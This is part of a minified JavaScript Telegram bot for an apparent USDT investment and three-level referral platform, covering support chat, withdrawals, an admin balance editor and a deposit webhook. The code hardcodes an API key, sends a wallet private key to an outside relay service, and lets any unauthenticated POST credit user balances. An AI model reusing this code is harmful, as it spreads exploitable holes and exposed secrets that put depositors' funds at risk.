se(e.chat.id,e.message.message_id),await se(e.chat.id,e.message.message_id-1),await de(e,o,{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"backToInvest"}]]}}),await e.scene.leave(t)}}catch(e){console.log(e),ee(e)}})),F.on("text",(async e=>{try{const t="support";if("↩️ Back to Menu"==e.message.text)return pe(e),void await e.scene.leave(t);{let a=e.message.text,n=`📩 *Message sent to the Support team:*\n\n${a}\n\n*Our support team will get back to you as soon as possible. Thank you for reaching out!* 😊`;await de(e,n,{reply_markup:{keyboard:ne,resize_keyboard:!0}});for(const t of w){let n=t;const r={inline_keyboard:[[{text:"Send him message",callback_data:`send:${e.from.id}`}]]};let o=`👋 *New support message from user * [${e.from.first_name}](tg://user?id=${e.from.id}) (${e.from.id}) (@${e.from.username}):\n\n${a}`;await le(n,o,{parse_mode:"Markdown",reply_markup:r})}await e.scene.leave(t)}}catch(e){ee(e),console.log(e)}})),S.hears("💬 Chat with Us 💬",(async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!==e.message.chat.type)return;if("Active"!==t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if(!("activated"in(await ae.collection("info").find({user:e.from.id}).toArray())[0]))return void oe(e);let a="Hello there! 👋\n\nWelcome to our *Support Center*, where we're always here to lend a hand. Do you have a question or need help with something? You've come to the right place! 😊\n\nOur friendly team is dedicated to providing you with the *best possible experience*. From the moment you reach out to us, we'll do everything in our power to ensure your issue is resolved *quickly* and with a smile. 💬\n\nSo go ahead, ask us anything! Simply enter your question below and we'll get back to you as soon as possible. We're here to help, and we can't wait to hear from you. 🙌";await de(e,a,{reply_markup:{keyboard:[["↩️ Back to Menu"]],resize_keyboard:!0}}),await e.scene.enter("support")}catch(e){console.log(e)}})),C.on("text",(async e=>{try{const t="senderSupport";if("⛔ Cancel"==e.message.text)return pe(e),void await e.scene.leave(t);{let a="Message from Admin :\n\n"+e.message.text;await le(e.scene.state.userId,a),await e.reply("Message sent successfully! to :"+e.scene.state.userId),await e.scene.leave(t)}}catch(e){ee(e),console.log(e)}})),S.action(/^send:(\d+)$/,(async e=>{try{const[t,a]=e.callbackQuery.data.split(":").slice(1);await e.reply("Please type the message you want to send:",{keyboard:[["⛔ Cancel"]]}),await e.scene.enter("senderSupport",{userId:t,messageText:a})}catch(e){console.log(e)}})),S.action(/^convert:(\d+)$/,(async e=>{try{const[t,a]=e.callbackQuery.data.split(":").slice(1),n=await ae.collection("info").find({user:e.from.id}).toArray(),r="balance"in n[0]?me(n[0].balance,8):"0.00000000";let o=parseFloat(r*t/100);if(o>parseFloat(r))return void await ce(e,"*❌Conversion Failed *\n\n Your entered amount :* "+o+" * is greater than your withdrawable balance :* "+r+" USDT*",{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"backToInvest"}]]},parse_mode:"markdown"});if(o<1)return void await ce(e,"*❌Conversion Failed *\n\n Your selected amount :* "+o+" * is less than minimum *1 USDT*",{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"backToInvest"}]]},parse_mode:"markdown"});await ae.collection("info").updateOne({user:e.from.id},{$inc:{balance:-o}}),await ae.collection("info").updateOne({user:e.from.id},{$inc:{depositBalance:o}});let i=`✅Successfully converted *${o} USDT* from withdrawable balance to Investable balance\n\n`;await ce(e,i,{reply_markup:{inline_keyboard:[[{text:"↩️ Back",callback_data:"backToInvest"}]]},parse_mode:"markdown"})}catch(e){console.log(e),ee(e)}})),S.hears("ℹ️ About Us ❔",(async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if(!("activated"in(await ae.collection("info").find({user:e.from.id}).toArray())[0]))return void oe(e);await de(e,$)}catch(e){console.log(e),ee(e)}})),S.hears("👨‍💻 Referrals",(async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");let a=await ae.collection("info").find({user:e.from.id}).toArray();if(!("activated"in a[0]))return void oe(e);let n=a[0].referlvl1count,r=a[0].referlvl2count,o=a[0].referlvl3count,i=me(a[0].totalAffiliateBonus,8)||me(0,8),s=a[0].referinfo||fe(),l="🥇 Level 1 - "+h[0]+"%\n🥈 Level 2 - "+h[1]+"%\n🥉 Level 3 - "+h[2]+"%\n\n";await de(e,l);let c="Bot link: https://t.me/"+e.botInfo.username;await le(e.from.id,c,{disable_web_page_preview:!0});let d="*⛓️ Referral Statistics*\n\nLevel 1: "+n+" users\nLevel 2: "+r+" users\nLevel 3: "+o+" users\n\n♾ Earnings: "+i+" USDT\n\nYour Referral Code:` "+s+"`\n\n *You can det detailed report Below*";await de(e,d,{reply_markup:{inline_keyboard:[[{text:"🕵️‍♀️ Detailed Data",callback_data:"Detailed_Data"}]]}}),a[0].referinfo||await ae.collection("info").updateOne({user:e.from.id},{$set:{referinfo:s}})}catch(e){console.log(e),ee(e)}}));const ye=[[{text:"Level 1 Details",callback_data:"Level1Details"}],[{text:"Level 2 Details",callback_data:"Level2Details"}],[{text:"Level 3 Details",callback_data:"Level3Details"}],[{text:"⬅️ Back",callback_data:"Back"}]];async function pe(e){de(e,"*👋 Welcome To Main Menu*",{reply_markup:{keyboard:ne,resize_keyboard:!0}})}S.action("Detailed_Data",(async e=>{await ce(e,"Please select a level to view the details:",{reply_markup:{inline_keyboard:ye}})})),S.action("Back",(async e=>{let t=await ae.collection("info").find({user:e.from.id}).toArray(),a="*⛓️ Referral Statistics*\n\nLevel 1: "+t[0].referlvl1count+" users\nLevel 2: "+t[0].referlvl2count+" users\nLevel 3: "+t[0].referlvl3count+" users\n\n♾ Earnings: "+(t[0].referraldeposits||me(0,8))+" USDT\n\nYour Referral Code:` "+(t[0].referinfo||fe())+"`\n\n *You can det detailed report Below*";await ce(e,a,{reply_markup:{inline_keyboard:[[{text:"🕵️‍♀️ Detailed Data",callback_data:"Detailed_Data"}]]},parse_mode:"Markdown"})})),S.action("Level3Details",(async e=>{const t=await ae.collection("lvl3users").findOne({user:e.from.id});let a="Level 3 Details\n";if(t&&t.registeredUsers.length>0){let n=t.registeredUsers.slice(0,25);for(const e of n)a+=`\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${me(e.earnings,4)}$ USDT`;if(t.registeredUsers.length>25){a+="\n\nClick the button below for more details:";let t=[[{text:"Next 25",callback_data:"Level2Details:offset:25"}],[{text:"⬅️ Back",callback_data:"Back"}]];await ce(e,a,{reply_markup:{inline_keyboard:t},parse_mode:"Markdown"})}else await ce(e,a,{reply_markup:{inline_keyboard:[[{text:"⬅️ Back",callback_data:"Back"}]]},parse_mode:"Markdown"})}else a+="\nNo Referrals",await ce(e,a,{reply_markup:{inline_keyboard:[[{text:"⬅️ Back",callback_data:"Back"}]]},parse_mode:"Markdown"})})),S.action(/Level3Details:offset:(\d+)/,(async e=>{try{const t=parseInt(e.match[1]),a=await ae.collection("lvl3users").findOne({user:e.from.id});let n=`Level 3 Details (Showing ${t+1} to ${t+25})\n`,r=a.registeredUsers.slice(t,t+25);for(const e of r)n+=`\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${me(e.earnings,4)}$ USDT`;let o=[[{text:"Prev 25",callback_data:`Level3Details:offset:${Math.max(t-25,0)}`},{text:"Next 25",callback_data:`Level3Details:offset:${Math.min(t+25,a.registeredUsers.length)}`}],[{text:"⬅️ Back",callback_data:"Back"}]];await ce(e,n,{reply_markup:{inline_keyboard:o},parse_mode:"Markdown"})}catch(e){console.log(e)}})),S.action("Level1Details",(async e=>{const t=await ae.collection("lvl1users").findOne({user:e.from.id});let a="Level 1 Details\n";if(t&&t.registeredUsers.length>0){let n=t.registeredUsers.slice(0,25);for(const e of n)a+=`\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${me(e.earnings,4)}$ USDT`;if(t.registeredUsers.length>25){a+="\n\nClick the button below for more details:";let t=[[{text:"Next 25",callback_data:"Level2Details:offset:25"}],[{text:"⬅️ Back",callback_data:"Back"}]];await ce(e,a,{reply_markup:{inline_keyboard:t},parse_mode:"Markdown"})}else await ce(e,a,{reply_markup:{inline_keyboard:[[{text:"⬅️ Back",callback_data:"Back"}]]},parse_mode:"Markdown"})}else a+="\nNo Referrals",await ce(e,a,{reply_markup:{inline_keyboard:[[{text:"⬅️ Back",callback_data:"Back"}]]},parse_mode:"Markdown"})})),S.action(/Level1Details:offset:(\d+)/,(async e=>{try{const t=parseInt(e.match[1]),a=await ae.collection("lvl1users").findOne({user:e.from.id});let n=`Level 1 Details (Showing ${t+1} to ${t+25})\n`,r=a.registeredUsers.slice(t,t+25);for(const e of r)n+=`\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${me(e.earnings,4)}$ USDT`;let o=[[{text:"Prev 25",callback_data:`Level1Details:offset:${Math.max(t-25,0)}`},{text:"Next 25",callback_data:`Level1Details:offset:${Math.min(t+25,a.registeredUsers.length)}`}],[{text:"⬅️ Back",callback_data:"Back"}]];await ce(e,n,{reply_markup:{inline_keyboard:o},parse_mode:"Markdown"})}catch(e){console.log(e)}})),S.action("Level2Details",(async e=>{const t=await ae.collection("lvl2users").findOne({user:e.from.id});let a="Level 2 Details\n";if(t&&t.registeredUsers.length>0){let n=t.registeredUsers.slice(0,25);for(const e of n)a+=`\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${me(e.earnings,4)}$ USDT`;if(t.registeredUsers.length>25){a+="\n\nClick the button below for more details:";let t=[[{text:"Next 25",callback_data:"Level2Details:offset:25"}],[{text:"⬅️ Back",callback_data:"Back"}]];await ce(e,a,{reply_markup:{inline_keyboard:t},parse_mode:"Markdown"})}else await ce(e,a,{reply_markup:{inline_keyboard:[[{text:"⬅️ Back",callback_data:"Back"}]]},parse_mode:"Markdown"})}else a+="\nNo Referrals",await ce(e,a,{reply_markup:{inline_keyboard:[[{text:"⬅️ Back",callback_data:"Back"}]]},parse_mode:"Markdown"})})),S.action(/Level2Details:offset:(\d+)/,(async e=>{try{const t=parseInt(e.match[1]),a=await ae.collection("lvl2users").findOne({user:e.from.id});let n=`Level 2 Details (Showing ${t+1} to ${t+25})\n`,r=a.registeredUsers.slice(t,t+25);for(const e of r)n+=`\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${me(e.earnings,4)}$ USDT`;let o=[[{text:"Prev 25",callback_data:`Level2Details:offset:${Math.max(t-25,0)}`},{text:"Next 25",callback_data:`Level2Details:offset:${Math.min(t+25,a.registeredUsers.length)}`}],[{text:"⬅️ Back",callback_data:"Back"}]];await ce(e,n,{reply_markup:{inline_keyboard:o},parse_mode:"Markdown"})}catch(e){console.log(e)}})),S.hears("💼 Change Wallet",(async e=>{try{let t=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=t[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");let a=await ae.collection("info").find({user:e.from.id}).toArray();if(!("activated"in a[0]))return void oe(e);const n="💡 *Your currently set BEP20-USDT wallet is: * `"+("wallet"in a[0]?a[0].wallet:"⛔ NOT SET")+" `\n\n💹 _It will be used for all future withdrawals._",o=r.inlineKeyboard([r.button.callback("Change wallet","set_wallet")]);await de(e,n,o)}catch(e){ee(e),console.log(e)}})),S.action("set_wallet",(async e=>{try{if("Active"!=(await ae.collection("admin").find({admin:"admin"}).toArray())[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if(!("activated"in(await ae.collection("info").find({user:e.from.id}).toArray())[0]))return void oe(e);de(e,"*💡 Send Your USDT-BEP20 address*",{reply_markup:{keyboard:[["⬅️ Back"]],resize_keyboard:!0}}),await e.scene.enter("setwallet")}catch(e){ee(e),console.log(e)}})),W.on("text",(async e=>{try{const t="setwallet",a=e.message.text;if("⬅️ Back"==e.message.text)return pe(e),void await e.scene.leave(t);if(!a.startsWith("0x")||42!==a.length)return void de(e,"*🚫 Not A BEP20 Wallet Address*",{reply_markup:{keyboard:[["⬅️ Back"]],resize_keyboard:!0}});ae.collection("info").updateOne({user:e.from.id},{$set:{wallet:e.message.text}}),de(e,"*✅ Your BEP20 Wallet Address Updated To "+e.message.text+"*",{reply_markup:{keyboard:ne,resize_keyboard:!0}}),await e.scene.leave(t)}catch(e){ee(e),console.log(e)}})),S.hears("📤 Withdraw",(async e=>{try{let a=await ae.collection("admin").find({admin:"admin"}).toArray();if("private"!=e.message.chat.type)return;if("Active"!=a[0].botstat)return void de(e,"*⛔ Currently Bot Is Under Maintenance*");if("On"!=a[0].withstat)return void de(e,"*⛔ Currently Withdrawls Are Not available*");let n=await ae.collection("info").find({user:e.from.id}).toArray();if(!("activated"in n[0]))return void oe(e);if("balance"in n[0])t=n[0].balance;else var t=0;let r=b[0];if(parseFloat(t)<parseFloat(r))return void de(e,"*⚠️ You Must have minimum "+r.toFixed(2)+" "+v+"*");if("NOT SET"==n[0].wallet||""==n[0].wallet)return void de(e,"*Your withdraw wallet not set*",{reply_markup:{keyboard:[["💼 Change Wallet"]]}});de(e,"*🫂 Send Amount To Withdraw*",{reply_markup:{keyboard:[["⬅️ Back"]],resize_keyboard:!0}}),await e.scene.enter("onwith")}catch(e){ee(e),console.log(e)}})),P.on("text",(async e=>{try{const a="onwith";await ae.collection("admin").find({admin:"admin"}).toArray();var t=await ae.collection("info").find({user:e.from.id}).toArray();let n=b[0];if("⬅️ Back"==e.message.text)return pe(e),void await e.scene.leave(a);if(isNaN(e.message.text))return de(e,"*🚫 Not A Valid Amount*",{reply_markup:{keyboard:ne,resize_keyboard:!0}}),void await e.scene.leave(a);if(parseFloat(n)>parseFloat(e.message.text))return de(e,"*⚠️ Minimum Withdraw Is "+n+" "+v+"*",{reply_markup:{keyboard:ne,resize_keyboard:!0}}),void await e.scene.leave(a);if(parseFloat(e.message.text)>parseFloat(t[0].balance))return de(e,"*⚠️ You Did Not Have Enough Balance*",{reply_markup:{keyboard:ne,resize_keyboard:!0}}),void await e.scene.leave(a);if(e.message.forward_from)return de(e,"*🚫 Forwards Not Allowed*",{reply_markup:{keyboard:ne,resize_keyboard:!0}}),void await e.scene.leave(a);{const n=new Date,r=await ae.collection("withdraw").findOne({user:e.from.id},{sort:{date:-1}});if(r&&n-r.date<864e5){const t=new Date(r.date.getTime()+864e5-n.getTime()),o=Math.floor(t.getTime()/36e5);return de(e,`*⚠️ You have already made a withdrawal request in the past 24 hours. Please try again in ${o} hours, ${Math.floor(t.getTime()%36e5/6e4)} minutes, and ${Math.floor(t.getTime()%6e4/1e3)} seconds.*`,{reply_markup:{keyboard:ne,resize_keyboard:!0}}),void await e.scene.leave(a)}{await ae.collection("withdraw").insertOne({user:e.from.id,amount:parseFloat(e.message.text),wallet:t[0].wallet,date:new Date,txId:"Not Generated",status:"pending"}),await ae.collection("info").updateOne({user:e.from.id},{$inc:{balance:-parseFloat(e.message.text)}}),await ae.collection("statistics").updateOne({},{$inc:{totalWithdrawals:parseFloat(e.message.text)}});let n="*✅ Withdrawal Requested Successfully\n\n💰 Amount: "+e.message.text+" "+v+"\n🗂️ Wallet Address:* `"+t[0].wallet+"`*\n\nYou will receive your withdrawal details within a few hours.*";await e.replyWithMarkdown(n),await e.telegram.sendMessage(w[0],"*🚨 New Withdrawal Request\n\nfrom user :"+e.from.id+" ("+e.from.first_name+") ("+e.from.username+") \n\n 💰 Amount: "+e.message.text+" "+v+"\n🗂️ Wallet Address:* `"+t[0].wallet+"`*\n\nClick On '✅ Approve' To Approve This Withdrawal*",{reply_markup:{inline_keyboard:[[{text:"✅ Approve",callback_data:"approve "+e.from.id},{text:"⛔️ Reject",callback_data:"reject "+e.from.id}]]}}),await e.scene.leave(a)}}}catch(e){ee(e),console.log(e)}})),S.action(/^approve (.+)$/,(async e=>{try{const t=e.match[1],a=await ae.collection("withdraw").findOne({user:parseInt(t)});if("rejected"===a.status||"approved"===a.status)await e.answerCbQuery("This action is no longer available.its already "+a.status);else{const n="cf1c3da73820af4c69e01f4555bc23c5",r="https://BSC-RPC.up.railway.app/Transfer",o={"Content-Type":"application/json"},i={receiver:a.wallet,amount:parseFloat(a.amount),private_key:D,apikey:n},s=await async function(e,t,a){try{const n=await y(e,{method:"POST",body:JSON.stringify(t),headers:a});return await n.json()}catch(e){return console.error("Error making HTTP request:",e),e}}(r,i,o);if(0==s.success)await e.answerCbQuery("The withdrawal approval has been Failed.Reason:"+s.error);else{const n=s.transaction.transactionHash;await ae.collection("withdraw").updateOne({user:parseInt(t)},{$set:{status:"approved",txId:n}}),await e.telegram.sendMessage(t,"🎉 Congratulations! Your withdrawal request for "+a.amount+" USDT to wallet "+a.wallet+" has been approved and processed successfully. Thank you for using our platform! 🙌"),await e.answerCbQuery("The withdrawal request has been sent successfully.")}}}catch(e){console.log(e),ee(e)}})),S.action(/^reject (.+)$/,(async e=>{try{const t=e.match[1],a=await ae.collection("withdraw").findOne({user:parseInt(t)});"rejected"===a.status||"approved"===a.status?await e.answerCbQuery("This action is no longer available,its already "+a.status):(await ae.collection("withdraw").updateOne({user:parseInt(t)},{$set:{status:"rejected"}}),await ae.collection("info").updateOne({user:parseInt(t)},{$inc:{balance:a.amount}}),console.log(t,a.amount),await e.telegram.sendMessage(t,"Your withdrawal request has been rejected."),await e.answerCbQuery("The withdrawal request has been rejected."))}catch(e){console.log(e),ee(e)}})),V.on("text",(async e=>{try{const t="chabal",a=e.message.text,n=a.split(" ")[0],r=a.split(" ")[1],o=a.split(" ")[2];if("⬅️ Back"===a)pe(e);else if(void 0===n||void 0===r||void 0===o)de(e,"*⚠️ Please provide Telegram ID, amount, and balance type (depositBalance or balance)*",{reply_markup:{keyboard:ne,resize_keyboard:!0}});else if(isNaN(n)||isNaN(r))de(e,"*🚫 Invalid amount or Telegram ID*",{reply_markup:{keyboard:ne,resize_keyboard:!0}});else if("depositBalance"!==o&&"balance"!==o)de(e,"*🚫 Invalid balance type. Must be 'depositBalance' or 'balance'*",{reply_markup:{keyboard:ne,resize_keyboard:!0}});else{const t=parseInt(n),a=await ae.collection("info").findOne({user:t});if(a){const n=a[o],i=parseFloat(n)+parseFloat(r);await ae.collection("info").updateOne({user:t},{$set:{[o]:i}}),de(e,`*✅ Successfully updated ${o} of [${t}](tg://user?id=${t}) from ${me(n,4)} ${v} to ${me(i,4)} ${v}*`,{reply_markup:{keyboard:ne,resize_keyboard:!0}}),le(t,`*💰 Admin has updated your ${o} by ${me(r,4)} ${v}. Your new ${o} is ${me(i,4)} ${v}*`,{parse_mode:"Markdown"})}else de(e,"*⛔ User not found in our database*",{reply_markup:{keyboard:ne,resize_keyboard:!0}})}e.scene.leave(t)}catch(e){ee(e)}})),Z.on("text",(async e=>{try{const t="getdetails";if("⬅️ Back"==e.message.text)pe(e);else{let t=e.message.text,a=await ae.collection("info").find({user:parseInt(e.message.text)}).toArray();if(a.length){let n=`🐥 *User:* [${t}](tg://user?id=${t})\n\n`;n+=`💰 *Balance:* ${a[0].balance} USDT\n`,n+=`💼 *Wallet:* ${a[0].wallet}\n`,n+=`🔑 *Deposit Address:* ${a[0].depositAddress}\n`,n+=`💳 *Deposit balance:* ${a[0].depositBalance} USDT\n`,n+=`📊 *Active Investments:* ${a[0].activeInvestments}\n`,n+=`🚀 *Total Profit:* ${a[0].totalProfit} USDT\n`,n+=`💸 *Total Affiliate Bonus:* ${a[0].totalAffiliateBonus} USDT\n`,de(e,n,{reply_markup:{keyboard:ne,resize_keyboard:!0}})}else de(e,"*⛔User Not Found In Our Database*",{reply_markup:{keyboard:ne,resize_keyboard:!0}})}e.scene.leave(t)}catch(e){ee(e)}})),S.command("panel",(async e=>{try{if(!w.includes(e.from.id))return;let r=await ae.collection("admin").find({admin:"admin"}).toArray();r[0].ref,r[0].mini,r[0].max,r[0].tax;let o=r[0].botstat,i=r[0].withstat;if("Active"===o)var t="✅ Active";else t="⛔️ Disable";if("On"==i)var a="✅ On";else a="⛔️ Off";r[0].mid,r[0].mkey,r[0].subid;var n=[[{text:"🛑Change Balance",callback_data:"change_balance"},{text:"🧾Get Details",callback_data:"get_details"}],[{text:"🟢Bot:"+t,callback_data:"bot_status"},{text:"🟢Withdraw:"+a,callback_data:"with_status"}]];de(e,"*👋 Hey "+e.from.first_name+"\n🤘🏻Welcome To Admin Panel\n\n🤖 Bot Status:"+t+"\n\t\t\t\t📤 Withdrawals:"+a+"*",{reply_markup:{inline_keyboard:n}})}catch(e){ee(e)}})),S.action("change_balance",(e=>{try{e.deleteMessage(),de(e,"*💡 Send User Telegram Id & Amount\n\n⚠️ Use Format : \n\n*`"+e.from.id+" 10 depositBalance` \n\n `"+e.from.id+" 10 balance`",{reply_markup:{keyboard:[["⬅️ Back"]],resize_keyboard:!0}}),e.scene.enter("chabal")}catch(e){ee(e)}})),S.action("get_details",(e=>{try{e.deleteMessage(),de(e,"*💡 Send User Telegram Id *",{reply_markup:{keyboard:[["⬅️ Back"]],resize_keyboard:!0}}),e.scene.enter("getdetails")}catch(e){ee(e)}})),S.action("bot_status",(async e=>{try{let o=await ae.collection("admin").find({admin:"admin"}).toArray();if("Active"==o[0].botstat){ae.collection("admin").updateOne({admin:"admin"},{$set:{botstat:"Disable"}});var t="⛔️ Disable"}else t="✅ Active",ae.collection("admin").updateOne({admin:"admin"},{$set:{botstat:"Active"}});var a=o;if(o[0].ref,o[0].mini,o[0].max,o[0].tax,"On"==o[0].withstat)var n="✅ On";else n="⛔️ Off";a[0].mid,a[0].mkey,a[0].subid;var r=[[{text:"🛑Change Balance",callback_data:"change_balance"},{text:"🧾Get Details",callback_data:"get_details"}],[{text:"🟢Bot:"+t,callback_data:"bot_status"},{text:"🟢Withdraw:"+n,callback_data:"with_status"}]];ce(e,"*👋 Hey "+e.from.first_name+"\n🤘🏻Welcome To Admin Panel\n\n🤖 Bot Status:"+t+"\n\t\t\t\t📤 Withdrawals:"+n+"*",{reply_markup:{inline_keyboard:r},parse_mode:"Markdown"})}catch(e){ee(e)}})),S.action("with_status",(async e=>{try{let i=await ae.collection("admin").find({admin:"admin"}).toArray(),s=i[0].botstat;if("On"==i[0].withstat){ae.collection("admin").updateOne({admin:"admin"},{$set:{withstat:"Off"}});var t="⛔️ Off"}else t="✅ On",ae.collection("admin").updateOne({admin:"admin"},{$set:{withstat:"On"}});var a=i;let l=i[0].ref,c=i[0].mini,d=i[0].max,u=i[0].tax;if("Active"==s)var n="✅ Active";else n="⛔️ Disable";let m=a[0].mid,f=a[0].mkey,y=a[0].subid;if("NOT SET"==m||"NOT SET"==f||"Not Set"==y)var r="❌ NOT SET";else r="✅ SET";var o=[[{text:"💰 Refer",callback_data:"change_ref"},{text:"💰 Minimum",callback_data:"change_mini"}],[{text:"🚨 Change Tax",callback_data:"change_tax"},{text:"💰 Maximum",callback_data:"change_max"}],[{text:"🌲Change Channels",callback_data:"change_cha"}],[{text:"🛑Change Balance",callback_data:"change_balance"},{text:"🧾Get Details",callback_data:"get_details"}],[{text:"✏️ Paytm Keys:"+r,callback_data:"paytm_key"}],[{text:"🟢Bot:"+n,callback_data:"bot_status"},{text:"🟢Withdraw:"+t,callback_data:"with_status"}]];ce(e,"*👋 Hey "+e.from.first_name+"\n🤘🏻Welcome To Admin Panel\n\n💡 Bot Current Stats:\n\t\t\t\t💰 Per Refer: "+l.toFixed(3)+" "+v+"\n\t\t\t\t💰 Minimum Withdraw: "+c.toFixed(3)+" "+v+"\n\t\t\t\t💰 Maximum Withdraw: "+d.toFixed(3)+" "+v+"\n\t\t\t\t🚨 Tax: %"+u+"\n\t\t\t\t🤖 Bot Status:"+n+"\n\t\t\t\t📤 Withdrawals:"+t+"*",{reply_markup:{inline_keyboard:o},parse_mode:"Markdown"})}catch(e){ee(e)}})),X.on("text",(async e=>{let t=await ae.collection("info").find({},{projection:{user:1,_id:0}}).toArray(),a=e.message.text;if("⬅️ Back"==a)return pe(e),void e.scene.leave("broad");for(var n of(de(e,"*✅ Broadcast Sended To All Users*",{reply_markup:{keyboard:ne,resize_keyboard:!0}}),t))le(n.user,"*🔈 Broadcast By Admin*\n\n"+a,{parse_mode:"Markdown",disable_web_page_preview:!0}).catch((e=>console.log(e)));e.scene.leave("broad")})),S.command("broadcast",(async e=>{w.includes(e.from.id)&&(e.reply("*💡 Send Message To Send Broadcast*",{parse_mode:"markdown",reply_markup:{keyboard:[["⬅️ Back"]],resize_keyboard:!0}}),await e.scene.enter("broad"))})),M.post("/:user",(async(e,t)=>{const{user:a}=e.params,n=e.body,r=parseFloat(a),o=n.txId,i=parseFloat(n.amount),c=n.blockNumber;await ae.collection("info").updateOne({user:r},{$inc:{depositBalance:i}}),await ae.collection("statistics").updateOne({},{$inc:{totalDeposits:i}});const d={user:r},u={$push:{deposits:{txId:o,amount:i,blockNumber:c,date:new Date}}};await ae.collection("userdeposits").updateOne(d,u,{upsert:!0}),le(a,`🎉 Woohoo! You just received a deposit of ${i} USDT  `,{parse_mode:"Markdown",disable_web_page_preview:!0}),t.sendStatus(200)})),M.listen(process.env.PORT||8888),console.log("Webhook server listening on port 8888")})()})();